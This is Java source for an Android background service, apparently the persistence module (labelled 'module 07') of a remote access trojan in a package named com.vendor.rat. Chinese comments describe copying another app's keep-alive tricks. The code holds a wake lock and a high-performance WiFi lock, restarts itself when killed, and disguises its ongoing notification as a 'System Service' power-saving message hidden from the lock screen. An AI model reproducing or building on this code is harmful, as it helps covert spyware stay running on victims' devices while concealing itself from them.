package com.vendor.rat.keepalive.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.vendor.rat.MainApplication;
import com.vendor.rat.config.AppConfig;

/**
 * 保活前台服务 (模块 07)
 *
 * 对齐 vendor 三层保活策略:
 * 1. startForeground() — 防止华为 PowerGenie 冻结进程
 * 2. WakeLock (PARTIAL_WAKE_LOCK) — 保持 CPU 唤醒
 * 3. WifiLock (WIFI_MODE_FULL_HIGH_PERF) — 保持 WiFi 连接不断 (关键!)
 * 4. START_STICKY — 被杀后自动重启
 * 5. onDestroy() 自我重启 — 对齐 vendor LiveChat
 *
 * Vendor 参考:
 *   - MediaLiveService: startForeground(100, notification)
 *   - a1/q.java:446: WakeLock(SCREEN_BRIGHT|ACQUIRE_CAUSES_WAKEUP, 600000ms)
 *   - AccountAuthenticatorService: WifiLock(WIFI_MODE_FULL_HIGH_PERF)
 */
public class WIFIBackgroundService extends Service {

    private static final String TAG = "WIFIBgService";
    private static final String CHANNEL_ID = "keepalive_channel";
    private static final int NOTIFICATION_ID = 101;

    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        acquireWakeLock();
        acquireWifiLock();
        Log.i(TAG, "Foreground service started with WakeLock + WifiLock");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWifiLock();
        releaseWakeLock();

        // 自我重启 (对齐 vendor LiveChat.onDestroy)
        try {
            Intent intent = new Intent(getApplicationContext(), WIFIBackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.w(TAG, "Self-restart failed", e);
        }

        Log.i(TAG, "Foreground service destroyed, attempting restart");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        String title = "待机省电模式";
        String content = "已进入待机省电模式，点击此处唤醒";

        // 从配置读取自定义通知文本
        MainApplication app = MainApplication.getInstance();
        if (app != null && app.getConfig() != null) {
            AppConfig config = app.getConfig();
            if (config.getNotificationTitle() != null) title = config.getNotificationTitle();
            if (config.getNotificationContent() != null) content = config.getNotificationContent();
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_lock_idle_low_battery)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "com.vendor.rat:keepalive"
                );
                wakeLock.acquire();
                Log.d(TAG, "WakeLock acquired");
            }
        } catch (Exception e) {
            Log.w(TAG, "WakeLock acquire failed", e);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    /**
     * 获取 WifiLock — 防止后台时 WiFi 断开
     * 对齐 vendor: AccountAuthenticatorService.onCreate()
     *   wifiManager.createWifiLock(3, "MyWifiLockTag")  // 3 = WIFI_MODE_FULL_HIGH_PERF
     */
    private void acquireWifiLock() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null) {
                wifiLock = wm.createWifiLock(
                    WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                    "com.vendor.rat:wifilock"
                );
                wifiLock.setReferenceCounted(false);
                wifiLock.acquire();
                Log.d(TAG, "WifiLock acquired (WIFI_MODE_FULL_HIGH_PERF)");
            }
        } catch (Exception e) {
            Log.w(TAG, "WifiLock acquire failed", e);
        }
    }

    private void releaseWifiLock() {
        if (wifiLock != null && wifiLock.isHeld()) {
            wifiLock.release();
            Log.d(TAG, "WifiLock released");
        }
    }
}
